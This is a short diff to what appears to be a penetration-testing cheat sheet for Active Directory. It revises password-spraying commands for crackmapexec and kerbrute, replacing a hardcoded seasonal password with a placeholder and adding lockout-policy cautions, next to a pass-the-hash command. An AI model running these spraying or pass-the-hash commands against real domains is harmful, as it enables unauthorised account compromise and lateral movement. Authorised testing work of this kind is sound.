@@ -217,11 +217,12 @@ crackmapexec smb {target} -u {user} -H {ntlm_hash}
 # Check policy first
 crackmapexec smb {dc} -u {user} -p {pass} --pass-pol
 
-# Spray (ONE password at a time)
-crackmapexec smb {dc} -u users.txt -p 'Spring2026!' --no-bruteforce --continue-on-success
+# Spray ONE engagement-specific password at a time (build {SPRAY_PASSWORD} from OSINT;
+# get the lockout policy above first; omit --continue-on-success unless intended)
+crackmapexec smb {dc} -u users.txt -p '{SPRAY_PASSWORD}' --no-bruteforce
 
 # Kerbrute (faster, stealthier)
-kerbrute passwordspray -d {domain} --dc {dc} users.txt 'Spring2026!'
+kerbrute passwordspray -d {domain} --dc {dc} users.txt '{SPRAY_PASSWORD}'
 ```
 
 ### Lateral Movement
